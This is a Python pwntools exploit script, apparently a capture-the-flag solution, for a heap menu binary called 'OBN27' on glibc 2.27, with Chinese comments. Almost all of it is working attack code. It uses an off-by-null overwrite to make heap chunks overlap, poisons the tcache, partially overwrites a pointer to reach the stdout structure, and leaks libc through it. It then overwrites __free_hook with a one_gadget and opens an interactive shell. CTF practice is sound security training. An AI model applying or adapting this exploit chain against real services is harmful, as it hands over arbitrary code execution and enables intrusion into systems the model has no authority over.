#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

elf = ELF('./OBN27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,data):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('data:',data)
	
def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

while True:
	try:
		global p
		DEBUG = 1
		if DEBUG:
			p = process('./OBN27')
			libc = ELF('./libc-2.27.so')
			one_gadget = [0x4f2a5,0x4f302,0x10a2fc] #1.6
		else:
			p = remote('', )
			libc = ELF('./libc-2.27.so')
			one_gadget = [0x4f3d5,0x4f432,0x10a41c] #1.4

		#hp 0x2020c0
		## unlink header
		add(0x4f8, "chunk0") #idx0 chunk0 250
		add(0x88, "chunk1") #idx1 chunk1 750
		add(0xf8, "chunk2") #idx2 chunk2 7e0
		add(0x58, "chunk3") #idx3 chunk3 8e0
		add(0x4f8, "chunk4") #idx4 chunk4 940
		add(0x20, 'ccc') #idx5 chunk5 e40

		# gdb.attach(p)
		# pause()
		delete(0) # 放入 unsortedbin
		delete(3) # 放入 tcachebin

		add(0x58,'A'*0x50+p64(0x500+0x90+0x100+0x60)) #idx6 use chunk3, off by null，修改 chunk4 的 size 位
		delete(4) #向上合并堆块,这样就控制了chunk1 01234

		delete(1)
		# gdb.attach(p)
		# pause()
		add(0x4f0,'idx7') #idx7 use chunk0

		add(0x20,'\x60\xc7') #idx8
		add(0x80, "idx9") #idx9 use chunk1

		# gdb.attach(p)
		# pause()
		payload = p64(0xfbad1800) + p64(0)*3 + b"\n"
		add(0x80, payload) #idx10 分配去_IO_2_1_stdout_
		data = p.recv(4)
		if 'done' in data:
			continue
		p.recvuntil("\xff"*8)
		libcbase = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3eb780
		system = libcbase + libc.sym['system']
		free_hook = libcbase + libc.sym['__free_hook']

		pr("libcbase",libcbase)
		pr('system',system)
		pr('free_hook',free_hook)

		# gdb.attach(p)
		# pause()

		delete(2)
		add(0x50,'/bin/sh\x00') #idx11

		add(0x20, p64(free_hook)) #idx12
		add(0xf0,"idx13") #idx13
		add(0xf0, p64(one_gadget[1]+libcbase)) #idx14 或者 p64(system)

		# gdb.attach(p)
		# pause()

		p.sendlineafter(':','2')
		p.sendlineafter('idx:','11')

		p.interactive()
	except:
		pass
